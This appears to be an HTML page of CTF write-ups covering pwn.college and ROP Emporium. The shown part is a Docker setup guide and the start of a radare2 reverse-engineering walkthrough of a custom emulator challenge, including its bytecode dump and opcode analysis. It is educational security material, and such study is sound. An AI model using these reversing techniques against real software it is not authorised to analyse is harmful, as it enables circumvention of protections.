@@ -1,0 +1,4407 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>CTF Write-Ups</title>
+        <meta name="robots" content="noindex" />
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded "><a href="pwn.college/index.html"><strong aria-hidden="true">1.</strong> pwn.college</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn.college/2020/00-Setup/index.html"><strong aria-hidden="true">1.1.</strong> Docker Setup</a></li><li class="chapter-item expanded "><a href="pwn.college/2020/04-Rev/14_testing1/index.html"><strong aria-hidden="true">1.2.</strong> Reversing - Level 14</a></li></ol></li><li class="chapter-item expanded "><a href="rop_emporium/index.html"><strong aria-hidden="true">2.</strong> ROP Emporium</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/01-ret2win/index.html"><strong aria-hidden="true">2.1.</strong> ret2win</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/02-split/index.html"><strong aria-hidden="true">2.2.</strong> split</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/03-callme/index.html"><strong aria-hidden="true">2.3.</strong> callme</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/04-write4/index.html"><strong aria-hidden="true">2.4.</strong> write4</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/05-badchars/index.html"><strong aria-hidden="true">2.5.</strong> badchars</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/06-fluff/index.html"><strong aria-hidden="true">2.6.</strong> fluff</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/07-pivot/index.html"><strong aria-hidden="true">2.7.</strong> pivot</a></li><li class="chapter-item expanded "><a href="rop_emporium/solutions/x86_64/08-ret2csu/index.html"><strong aria-hidden="true">2.8.</strong> ret2csu</a></li></ol></li><li class="chapter-item expanded "><a href="overthewire/index.html"><strong aria-hidden="true">3.</strong> OverTheWire</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="overthewire/natas/solutions.html"><strong aria-hidden="true">3.1.</strong> Natas</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">CTF Write-Ups</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="write-ups-of-ctf-style-challenges"><a class="header" href="#write-ups-of-ctf-style-challenges">Write-Ups of CTF Style Challenges</a></h1>
+<p>Below is a selection of write-ups for some of the more interesting challenges:</p>
+<ul>
+<li><a href="./pwn.college/2020/04-Rev/14_testing1/index.html">pwn.college - rev_level14</a> (binary reverse engineering)</li>
+<li><a href="./rop_emporium/solutions/x86_64/07-pivot/index.html">ROP Emporium - pivot</a> (return oriented programming)</li>
+<li><a href="./rop_emporium/solutions/x86_64/08-ret2csu/index.html">ROP Emporium - ret2csu</a> (return oriented programming)</li>
+</ul>
+<p><a href="https://pwn.college/">pwn.college</a> has many amazing challenges, including one level that requires reverse engineering a <a href="https://github.com/pwncollege/challenges/raw/master/toddler1/level8_testing1">JIT compiler</a>. Due to their <a href="https://pwn.college/#collaboration-livestream-and-writeup-policy">write-up policy</a>, I am unable to share a write-up for this particular level. It is however a lot of fun and teaches some valuable concepts regarding JIT compilers, JIT spraying and how vulnerabilities can still be present despite having all standard security mitigations (e.g. DEP, stack canary, etc) enabled.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="pwncollege"><a class="header" href="#pwncollege">pwn.college</a></h1>
+<p><a href="https://pwn.college/">pwn.college</a> is a fantastic course for learning Linux based cybersecurity concepts.</p>
+<p>The 2020 version of the course covered:</p>
+<ul>
+<li>Module 1: Program Misuse</li>
+<li>Module 2: Shellcode</li>
+<li>Module 3: Sandboxing</li>
+<li>Module 4: Binary Reverse Engineering</li>
+<li>Module 5: Memory Errors</li>
+<li>Module 6: Exploitation</li>
+<li>Module 7: Return Oriented Programming</li>
+<li>Module 8: Kernel Introduction</li>
+<li>Module 9: Dynamic Allocator Misuse</li>
+<li>Module 10: Race Conditions</li>
+<li>Module 11: Advanced Exploitation</li>
+<li>Module 12: Automatic Vulnerability Discovery</li>
+</ul>
+<p>As per their website, the following prerequisite knowledge is recommended:</p>
+<ul>
+<li>C programming</li>
+<li>C compilation</li>
+<li>x86_64 assembly</li>
+<li>OS internals (system calls, etc)</li>
+<li>Linux operations (FS layout, permissions, shell scripting, etc)</li>
+</ul>
+<p>In accordance with pwn.college's <a href="https://pwn.college/#collaboration-livestream-and-writeup-policy">write-up policy</a>, some write-ups have been included in subsequent chapters.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="pwncollege---docker-setup"><a class="header" href="#pwncollege---docker-setup">pwn.college - Docker Setup</a></h1>
+<h2 id="on-host-machine"><a class="header" href="#on-host-machine">On Host Machine</a></h2>
+<ol>
+<li>
+<p>Download sample <a href="pwn.college/2020/00-Setup/./Dockerfile">Dockerfile</a></p>
+</li>
+<li>
+<p>Build Custom Docker Image</p>
+</li>
+</ol>
+<blockquote>
+<p><code>docker image prune -f &amp;&amp; docker build -t pwncollege_custom:v1 .</code></p>
+</blockquote>
+<ul>
+<li><code>docker image prune -f</code> forcefully removes unused images [optional]</li>
+<li><code>-t</code> gives image a tag in 'name:tag' format</li>
+<li><code>.</code> specifies location of <a href="pwn.college/2020/00-Setup/./Dockerfile">Dockerfile</a> is in current working directory</li>
+</ul>
+<ol start="3">
+<li>Run Docker Container</li>
+</ol>
+<blockquote>
+<p><code>docker image prune -f &amp;&amp; docker run -it --rm --name pwncollege_challenges pwncollege_custom:v1 /bin/bash</code></p>
+</blockquote>
+<ul>
+<li><code>docker image prune -f</code> forcefully removes unused images [optional]</li>
+<li><code>-it</code> keeps STDIN open even if not attached and allocates pseudo-TTY</li>
+<li><code>--rm</code> automatically removes container when it exits</li>
+<li><code>--name pwncollege_challenges</code> assigns name to container</li>
+<li><code>pwncollege_custom:v1</code> custom Docker image from step 1 above</li>
+<li><code>/bin/bash</code> command run by container</li>
+</ul>
+<ol start="4">
+<li>[optional] Connect to Running Container (from another terminal)</li>
+</ol>
+<blockquote>
+<p><code>docker exec -it pwncollege_challenges /bin/bash</code></p>
+</blockquote>
+<h2 id="in-docker-container"><a class="header" href="#in-docker-container">In Docker Container</a></h2>
+<ol start="5">
+<li>Copy ELF binary, then set privileges and setuid</li>
+</ol>
+<blockquote>
+<p><code>sudo cp /challenges/&lt;module_dir&gt;/&lt;elf_binary&gt; / &amp;&amp; sudo chmod 4755 /&lt;elf_binary&gt;</code></p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="pwncollege---binary-reverse-engineering----level14_testing1"><a class="header" href="#pwncollege---binary-reverse-engineering----level14_testing1">pwn.college - Binary Reverse Engineering  - level14_testing1</a></h1>
+<p>Disclaimer:</p>
+<ul>
+<li>At the time of writing this reverse engineering challenge write-up, I had already solved both this challenge and the teaching version of the challenge, plus all the later pwn.college reverse engineering challenges, so I knew the inner workings of the emulator very well. As a result, I may have glossed over some areas that might seem obvious now, but were potentially important when gathering information for the first time.</li>
+<li>Parts of the solution, such as the GDB script were not written in one go, but were refined over a number of iterations, and the format of the GDB script output borrows heavily from the ouput produced by the teaching version of the ELF binary.</li>
+</ul>
+<h2 id="part-0-setup-challenge"><a class="header" href="#part-0-setup-challenge">[Part 0] Setup Challenge</a></h2>
+<ul>
+<li>If using the Docker container setup referred to in <a href="pwn.college/2020/04-Rev/14_testing1/../../00-Setup/index.html">00-Setup</a>, a copy of the ELF binary can be found at <code>/challenges/babyrev/level14_testing1</code> in the Docker container, so copy ELF binary to root directory of Docker container, then set privileges and setuid:</li>
+</ul>
+<blockquote>
+<p><code>sudo cp /challenges/babyrev/level14_testing1 / &amp;&amp; sudo chmod 4755 /level14_testing1</code></p>
+</blockquote>
+<ul>
+<li>The original ELF binary can be found here: <a href="https://github.com/pwncollege/challenges/raw/master/babyrev/level14_testing1">download</a></li>
+<li>A copy of the ELF binary has also been included here: <a href="pwn.college/2020/04-Rev/14_testing1/./level14_testing1">download</a></li>
+<li>Add a fake flag if necessary:</li>
+</ul>
+<blockquote>
+<p>$ <code>echo pwn_college{a_secret_fake_flag} | sudo tee /flag &amp;&amp; sudo chown root:root /flag &amp;&amp; sudo chmod 400 /flag</code></p>
+</blockquote>
+<ul>
+<li>Test <code>/flag</code> file permissions deny access for current <code>ctf</code> user:</li>
+</ul>
+<blockquote>
+<p>$ <code>whoami</code><br />
+<code>ctf</code><br />
+$ <code>ls -al /flag</code><br />
+<code>-r-------- 1 root root 37 Aug 11 04:37 /flag</code><br />
+$ <code>cat /flag</code><br />
+<code>cat: /flag: Permission denied</code></p>
+</blockquote>
+<h3 id="basic-info-on-challenge-binary"><a class="header" href="#basic-info-on-challenge-binary">Basic Info on Challenge Binary</a></h3>
+<blockquote>
+<p><code>rabin2 -I /level14_testing1</code></p>
+</blockquote>
+<pre><code>arch     x86
+baddr    0x0
+binsz    16527
+bintype  elf
+bits     64
+canary   true
+class    ELF64
+compiler GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      true
+relocs   true
+relro    full
+rpath    NONE
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<ul>
+<li>pic is true, i.e. PIE is enabled</li>
+<li>ELF binary is not stripped</li>
+</ul>
+<h3 id="running-binary"><a class="header" href="#running-binary">Running Binary</a></h3>
+<blockquote>
+<p>$ <code>/level14_testing1</code></p>
+</blockquote>
+<pre><code>[+] Welcome to /level14_testing1!
+[+] This challenge is an custom emulator. It emulates a completely custom
+[+] architecture that we call &quot;Yan85&quot;! You'll have to understand the
+[+] emulator to understand the architecture, and you'll have to understand
+[+] the architecture to understand the code being emulated, and you will
+[+] have to understand that code to get the flag. Good luck!
+[+] Starting interpreter loop! Good luck!
+ENTER KEY: AAAAAAAA
+INCORRECT!
+</code></pre>
+<ul>
+<li>The program is a custom emulator of an unknown architecture called Yan85</li>
+<li>This write-up uses a combination of static and dynamic analysis to determine what instructions emulator supports, if it emulates registers, memory, syscalls, etc, then eventually gets the flag</li>
+</ul>
+<h2 id="part-1-static-analysis-using-a-hrefhttpsradarenradare2htmlradare2a"><a class="header" href="#part-1-static-analysis-using-a-hrefhttpsradarenradare2htmlradare2a">[Part 1] Static Analysis Using <a href="https://rada.re/n/radare2.html">radare2</a></a></h2>
+<ul>
+<li>Open ELF binary in radare2:</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A /level14_testing1</code></p>
+</blockquote>
+<ul>
+<li>The ELF binary is not too large, so <code>-A</code> analysis does not take long</li>
+<li>Note: as PIE is enabled, all memory addresses in radare2 should be interpreted <strong>relatively</strong> (i.e. not absolute references)</li>
+<li>List all functions (focus on the interesting ones, e.g. ignore imports <code>sym.imp.*</code>):</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>[...]
+0x0000129b   15 194          sym.read_register
+0x00001269    1 50           sym.crash
+[...]
+0x00001a7b   17 257          sym.interpret_instruction
+[...]
+0x000017f5   13 646          sym.interpret_sys
+0x000015e6    1 93           sym.interpret_stm
+0x00001461    1 48           sym.write_memory
+0x00001491    1 51           sym.interpret_imm
+0x0000135d   15 223          sym.write_register
+0x00001527    5 191          sym.interpret_stk
+[...]
+0x00001643    1 85           sym.interpret_ldm
+0x0000143c    1 37           sym.read_memory
+0x00001bff    3 274          main
+[...]
+0x00001b7c    2 131          sym.interpreter_loop
+[...]
+0x00001698   12 260          sym.interpret_cmp
+0x0000179c    4 89           sym.interpret_jmp
+0x000014c4    1 99           sym.interpret_add
+[...]
+</code></pre>
+<h4 id="view-main-function"><a class="header" href="#view-main-function">View main() Function</a></h4>
+<ul>
+<li>Visual Graph mode of <code>main</code> function (navigate using <code>hjkl</code> keys, press colon <code>:</code> to access command line):</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ main</code> (similar to <code>agfv @ main</code>)<br />
+Press <code>p</code> key once to display additional line info</p>
+</blockquote>
+<p><img src="pwn.college/2020/04-Rev/14_testing1/./img/01-main.png" alt="main function" /></p>
+<h4 id="emulators-bytecode"><a class="header" href="#emulators-bytecode">Emulator's Bytecode</a></h4>
+<ul>
+<li><code>obj.vm_code</code> should be the emulator's own bytecode and this is being memcpy'd on to the stack</li>
+<li>View hex dump of <code>obj.vm_code</code>:</li>
+</ul>
+<blockquote>
+<p><code>V @ obj.vm_code</code></p>
+</blockquote>
+<pre><code>[0x00004020 [Xadvc]0 62% 896 /level14_testing1]&gt; xc @ obj.vm_code    
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
+0x00004020  0101 4701 1089 4010 0101 012e 0110 8f40  ..G...@........@  ; obj.vm_code
+0x00004030  1001 0101 4c01 1082 4010 0101 01ab 0110  ....L...@.......
+0x00004040  8540 1001 0101 8601 1083 4010 0101 0157  .@........@....W
+0x00004050  0110 8a40 1001 0101 3401 1086 4010 0101  ...@....4...@...
+0x00004060  0127 0110 8740 1001 0101 3b01 108d 4010  .'...@....;...@.
+0x00004070  0101 01c2 0110 8c40 1001 0400 2004 0008  .......@.... ...
+0x00004080  0400 1001 0801 0208 0201 0145 0400 0101  ...........E....
+0x00004090  014e 0400 0101 0154 0400 0101 0145 0400  .N.....T.....E..
+0x000040a0  0101 0152 0400 0101 0120 0400 0101 014b  ...R..... .....K
+0x000040b0  0400 0101 0145 0400 0101 0159 0400 0101  .....E.....Y....
+0x000040c0  013a 0400 0101 0120 0400 0101 100b 0120  .:..... ....... 
+0x000040d0  0108 0401 0410 0004 0800 0420 0004 0020  ........... ... 
+0x000040e0  0400 0804 0010 0108 4001 100e 0120 0008  ........@.... ..
+0x000040f0  0801 0410 0004 0800 0420 0001 0197 0110  ......... ......
+0x00004100  8840 1001 0101 a801 108b 4010 0101 0190  .@........@.....
+0x00004110  0110 8e40 1001 0101 d201 1084 4010 0101  ...@........@...
+0x00004120  0489 0220 1002 0810 0101 ff02 2001 0208  ... ........ ...
+0x00004130  0104 0020 0400 0880 2020 8008 0820 2008  ... ....  ...  .  ; str._b_b___b
+0x00004140  0408 0004 2000 0101 6a10 0401 0101 ff02  .... ...j.......
+0x00004150  1001 0101 0020 1001 0101 5810 0401 0401  ..... ....X.....
+0x00004160  1004 0400 0108 0102 0802 0101 4904 0001  ............I...
+0x00004170  0101 4e04 0001 0101 4304 0001 0101 4f04  ..N.....C.....O.
+0x00004180  0001 0101 5204 0001 0101 5204 0001 0101  ....R.....R.....
+0x00004190  4504 0001 0101 4304 0001 0101 5404 0001  E.....C.....T...
+0x000041a0  0101 2104 0001 0101 0a04 0001 0110 0b01  ..!.............
+0x000041b0  2001 0804 0101 2001 0802 0001 2040 0108   ..... ..... @..
+0x000041c0  8401 100c 0101 0202 0104 0400 0101 0456  ...............V
+0x000041d0  0110 0020 0110 0101 9610 0201 0101 6c10  ... ..........l.
+0x000041e0  1101 0108 0102 0802 0101 4304 0001 0101  ..........C.....
+0x000041f0  4f04 0001 0101 5204 0001 0101 5204 0001  O.....R.....R...
+0x00004200  0101 4504 0001 0101 4304 0001 0101 5404  ..E.....C.....T.
+0x00004210  0001 0101 2104 0001 0101 2004 0001 0101  ....!..... .....
+0x00004220  4804 0001 0101 6504 0001 0101 7204 0001  H.....e.....r...
+0x00004230  0101 6504 0001 0101 2004 0001 0101 6904  ..e..... .....i.
+0x00004240  0001 0101 7304 0001 0101 2004 0001 0101  ....s..... .....
+0x00004250  7904 0001 0101 6f04 0001 0101 7504 0001  y.....o.....u...
+0x00004260  0101 7204 0001 0101 2004 0001 0101 6604  ..r..... .....f.
+0x00004270  0001 0101 6c04 0001 0101 6104 0001 0101  ....l.....a.....
+0x00004280  6704 0001 0101 3a04 0001 0101 0a04 0001  g.....:.........
+0x00004290  0110 1c01 2001 0804 0101 012f 0110 8040  .... ....../...@
+0x000042a0  1001 0101 6601 1081 4010 0101 016c 0110  ....f...@....l..
+0x000042b0  8240 1001 0101 6101 1083 4010 0101 0167  .@....a...@....g
+0x000042c0  0110 8440 1001 0101 0001 1085 4010 0101  ...@........@...
+0x000042d0  2080 0108 0008 2001 0108 8001 10ff 0120   ..... ........
+0x000042e0  0002 2001 0808 0101 0880 0110 0002 1001  .. .............
+0x000042f0  0120 0108 0401 0120 0008 0200 dc02 0000  . ..... ........  ; obj.vm_code_length
+</code></pre>
+<ul>
+<li>Assuming value @ 0x000042fc is <code>obj.vm_code_length</code>, which is <code>0x02dc</code> in little endian, test assumption:</li>
+</ul>
+<blockquote>
+<p>:&gt; <code>? 0x42fc-0x4020</code><br />
+<code>uint32  732</code><br />
+<code>hex     0x2dc</code></p>
+</blockquote>
+<ul>
+<li>Above vm_code_length assumption seems correct, therefore vm_code is from 0x00004020 to 0x000042fb, inclusive (also recall that PIE is enabled, so these addresses will be different when executing the program, but the relative addresses are still important)</li>
+<li>Some interesting strings are included in the bytecode:</li>
+<li>From 0x00004089 to 0x000040bb &quot;..E.....N.....T.....E.....R..... .....K.....E.....Y.....:&quot;</li>
+<li>From 0x0000416a to 0x000041a2 &quot;..I.....N.....C.....O.....R.....R.....E.....C.....T.....!&quot;</li>
+<li>From 0x000041e8 to 0x00004286 &quot;..C.....O.....R.....R.....E.....C.....T.....!..... .....H.....e.....r.....e..... .....i.....s..... .....y.....o.....u.....r..... .....f.....l.....a.....g.....:&quot;</li>
+<li>Note that the spacing is always the same between the ASCII characters</li>
+<li>Just before the call sym.interpreter_loop, rdi = stack address of the memcpy'd vm_code, rsi = original address of <code>obj.vm_code</code></li>
+</ul>
+<h4 id="view-interpreter_loop-function"><a class="header" href="#view-interpreter_loop-function">View interpreter_loop() Function</a></h4>
+<ul>
+<li>View <code>sym.interpreter_loop</code> function to understand if/how either variables are utilised:</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ sym.interpreter_loop</code></p>
+</blockquote>
+<ul>
+<li>Looks like rdi (stack address of the memcpy'd vm_code) is used, but rsi isn't:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/11-interpreter_loop.png" alt="interpreter_loop setup" /></li>
+<li>Last block of code is a loop:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/12-interpreter_loop.png" alt="interpreter_loop loop" /></li>
+<li>Above loop iterates over 3 bytes at a time</li>
+<li>Each byte is selected individually by doing some <code>shl</code>s (bitwise left shift) and <code>or</code>s then they are moved to the stack and back into registers before calling <code>sym.interpret_instruction</code>, either to sort or jumble the order (TBD: understand how the order is interpreted)</li>
+<li>Each instruction is therefore <strong>size 3 bytes</strong></li>
+</ul>
+<h4 id="view-interpret_instruction-function"><a class="header" href="#view-interpret_instruction-function">View interpret_instruction() Function</a></h4>
+<ul>
+<li>View <code>sym.interpret_instruction</code> to understand what instructions are supported by the emulator (focus on the branching, i.e. what <code>test</code>/<code>cmp</code> conditions are required to either jump or not jump?):</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ sym.interpret_instruction</code></p>
+</blockquote>
+<ul>
+<li>If opcode==0x01 then call <code>sym.interpret_imm</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/21-interpret_instruction.png" alt="interpret_instruction imm" /></li>
+<li>If opcode==0x02 then call <code>sym.interpret_add</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/22-interpret_instruction.png" alt="interpret_instruction add" /></li>
+<li>If opcode==0x04 then call <code>sym.interpret_stk</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/23-interpret_instruction.png" alt="interpret_instruction stk" /></li>
+<li>If opcode==0x40 then call <code>sym.interpret_stm</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/24-interpret_instruction.png" alt="interpret_instruction stm" /></li>
+<li><code>test al, al; jns 0x1b1f;</code> means jump if signed bit (most significant bit) of <code>al</code> register is <strong>not</strong> set (i.e. if signed bit <strong>is set</strong> then call <code>sym.interpret_ldm</code> because it <strong>didn't jump</strong>), therefore opcode==0x80 is a possible way to call <code>sym.interpret_ldm</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/25-interpret_instruction.png" alt="interpret_instruction ldm" /></li>
+<li>If opcode==0x20 then call <code>sym.interpret_cmp</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/26-interpret_instruction.png" alt="interpret_instruction cmp" /></li>
+<li>If opcode==0x10 then call <code>sym.interpret_jmp</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/27-interpret_instruction.png" alt="interpret_instruction jmp" /></li>
+<li>If opcode==0x08 then call <code>sym.interpret_sys</code>:<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/28-interpret_instruction.png" alt="interpret_instruction sys" /></li>
+</ul>
+<h4 id="view-write_register-function"><a class="header" href="#view-write_register-function">View write_register() Function</a></h4>
+<ul>
+<li>Remember the <code>sys.write_register</code> from earlier? List functions and perform internal grep for write_register (focus on the branching, i.e. what switch case values are required to reach different registers?):</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>afl~write_register</code></p>
+</blockquote>
+<ul>
+<li>View <code>sys.write_register</code> function to understand the registers:</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ sym.write_register</code></p>
+</blockquote>
+<p><img src="pwn.college/2020/04-Rev/14_testing1/./img/31-write_register.png" alt="write_register 0x3fc 0x3fd" />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/32-write_register.png" alt="write_register 0x3fe 0x3ff" />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/33-write_register.png" alt="write_register 0x400 0x401" />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/34-write_register.png" alt="write_register 0x402" />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/35-write_register.png" alt="write_register crash" /></p>
+<ul>
+<li>Register values are stored in memory at offsets 0x3fc to 0x402</li>
+<li>Temporarily name registers by their offsets and note down the switch case lookup refs:</li>
+<li>reg_0x3fc: 0x20 (case 32)</li>
+<li>reg_0x3fd: 0x08 (case 08)</li>
+<li>reg_0x3fe: 0x10 (case 16)</li>
+<li>reg_0x3ff: 0x01 (case 01)</li>
+<li>reg_0x400: 0x02 (case 02)</li>
+<li>reg_0x401: 0x04 (case 04)</li>
+<li>reg_0x402: 0x40 (case 40)</li>
+</ul>
+<h4 id="view-interpret_sys-function"><a class="header" href="#view-interpret_sys-function">View interpret_sys() Function</a></h4>
+<ul>
+<li>View <code>sym.interpret_sys</code> to understand what syscalls can be executed by the emulator (focus on the branching, i.e. what <code>test</code>/<code>cmp</code> conditions are required to either jump or not jump?):</li>
+</ul>
+<blockquote>
+<p>[0x00001180]&gt; <code>VV @ sym.interpret_sys</code></p>
+</blockquote>
+<ul>
+<li>If sys_value==0x20 then call open; int open(const char *path, int oflag):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/41-interpret_sys.png" alt="interpret_sys open" /></li>
+<li>Below are two code blocks that both make calls to the libc read function. It may not immediately be apparent what the difference between them is, but what is obvious is that they both attempt to read up to count <code>nbyte</code> bytes from file descriptor <code>fildes</code> into the buffer starting at <code>buf</code>. That is actually enough information to solve this challenge, but for later challenges it is worth understanding the difference.</li>
+<li>If sys_value==0x01 then call read; ssize_t read(int fildes, void *buf, size_t nbyte):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/42-interpret_sys.png" alt="interpret_sys read_code" /></li>
+<li>If sys_value==0x08 then call read; ssize_t read(int fildes, void *buf, size_t nbyte):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/43-interpret_sys.png" alt="interpret_sys read_memory" /></li>
+<li>If sys_value==0x04 then call write; ssize_t write(int fd, const char *ptr, size_t nbytes):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/44-interpret_sys.png" alt="interpret_sys write" /></li>
+<li>If sys_value==0x10 then call sleep; int sleep(int s):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/45-interpret_sys.png" alt="interpret_sys sleep" /></li>
+<li>If sys_value==0x02 then call exit; void exit(int status):<br />
+<img src="pwn.college/2020/04-Rev/14_testing1/./img/46-interpret_sys.png" alt="interpret_sys exit" /></li>
+</ul>
+<h4 id="view-interpret_cmp-function"><a class="header" href="#view-interpret_cmp-function">View interpret_cmp() Function</a></h4>
+<ul>
